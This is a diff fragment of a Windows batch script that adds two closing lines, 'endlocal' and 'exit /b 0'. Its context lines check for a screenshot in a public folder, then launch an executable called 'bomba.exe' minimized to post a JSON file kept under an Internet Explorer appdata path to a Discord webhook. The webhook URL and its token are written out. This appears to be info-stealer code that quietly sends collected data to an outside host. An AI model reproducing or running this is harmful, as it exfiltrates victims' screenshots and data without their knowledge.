@@ -27,6 +27,8 @@ if exist "C:\Users\Public\screenshot4.png" (
 )
 
 start /min "" "bomba.exe -post -url https://discord.com/api/webhooks/1486988281576034395/bF8-rj-jt58347vWv_rObDHCszseNYaG_luEsLx2NcffzUdmIQq80xrCVLbYaMuTzRo4 -json -path %appdata%\Microsoft\Internet Explorer\info.json"
+endlocal
+exit /b 0
 
 :download
 file = %0
